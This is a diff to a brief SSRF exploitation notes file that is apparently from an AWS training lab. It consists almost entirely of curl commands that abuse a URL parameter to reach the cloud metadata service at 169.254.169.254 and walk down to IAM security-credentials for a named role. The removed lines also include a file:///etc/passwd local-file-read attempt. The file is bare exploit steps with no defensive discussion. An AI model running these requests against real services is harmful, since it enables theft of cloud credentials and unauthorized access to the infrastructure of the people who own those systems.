@@ -1,14 +1,19 @@
 ~~~ Identifying SSRF Vuln ~~~
 
-curl http://lizardblue.com/video.php?url=https://ipcurl.com/batman.mp4 # base request
+http://10.0.2.39:8080/
 
-curl http://lizardblue.com/video.php?url=http://localhost:8000/ # SSRF attempt
+curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254
 
-curl http://lizardblue.com/video.php?url=file:///etc/passwd # LFI attempt
+curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest
 
-curl http://169.254.169.254/latest/meta-data/ # Target SSRF request
+curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/
 
-curl http://lizardblue.com/video.php?url=http://169.254.169.254/latest/meta-data/ # Leveraging SSRF to get AWS metadata
+curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/instance-id/
 
-curl http://lizardblue.com/video.php?url=http://169.254.169.254/latest/meta-data/iam/info # Leveraging SSRF to get AWS metadata
+curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/
 
+curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/info/
+
+curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+curl -G http://10.0.2.39:8080/extimage?p=http://169.254.169.254/latest/meta-data/iam/security-credentials/awstrainingstack001-bluelizardPrivEC2Role-PTH34586VUC1/
